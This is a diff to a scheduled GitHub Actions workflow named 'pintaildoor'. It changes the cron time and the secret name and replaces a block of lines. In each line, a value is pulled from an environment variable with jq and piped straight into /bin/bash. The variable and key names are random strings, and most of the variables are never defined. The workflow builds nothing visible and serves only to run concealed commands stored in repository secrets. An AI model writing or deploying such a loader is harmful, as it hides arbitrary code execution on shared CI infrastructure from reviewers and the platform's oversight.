@@ -1,10 +1,8 @@
 name: pintaildoor
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 3/6 * * *'
-
+    - cron: '47 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,17 +10,20 @@ jobs:
       - uses: actions/checkout@v4
       - name: pintaildoor
         env:
-          y97947: ${{ secrets.y97947 }}
+          ldhpl9577: ${{ secrets.ldhpl9577 }}
         run: |
-          echo $y97947 | jq -r .opx66755 | /bin/bash
-          echo $q075 | jq -r .wxt1 | /bin/bash
-          echo $djcqy205 | jq -r .tktr11 | /bin/bash
-          echo $rv6871 | jq -r .h9849 | /bin/bash
-          echo $sc6 | jq -r .yqmmw720 | /bin/bash
-          echo $soilg509 | jq -r .s13 | /bin/bash
-          echo $rlxbd89896 | jq -r .dxs0183 | /bin/bash
-          echo $ctegn3 | jq -r .j6 | /bin/bash
-          echo $wbpdx9 | jq -r .amjrc28387 | /bin/bash
-          echo $gomvv65338 | jq -r .uimh926 | /bin/bash
-          echo $ytqip94689 | jq -r .miv70 | /bin/bash
+          echo $ldhpl9577 | jq -r .t64 | /bin/bash
+          echo $lj104 | jq -r .tm5 | /bin/bash
+          echo $dj9 | jq -r .vxamy27390 | /bin/bash
+          echo $j085 | jq -r .kd1 | /bin/bash
+          echo $ekg990 | jq -r .d4124 | /bin/bash
+          echo $m3 | jq -r .wsui20 | /bin/bash
+          echo $bxlb46 | jq -r .x025 | /bin/bash
+          echo $dc596 | jq -r .vdd3 | /bin/bash
+          echo $cgqs0255 | jq -r .kdi2107 | /bin/bash
+          echo $j280 | jq -r .aycvj4552 | /bin/bash
+          echo $w28 | jq -r .he477 | /bin/bash
+          echo $yonkc453 | jq -r .nhma2 | /bin/bash
+          echo $w708 | jq -r .ybfdb53 | /bin/bash
+          echo $igzq85166 | jq -r .bdky6844 | /bin/bash
 
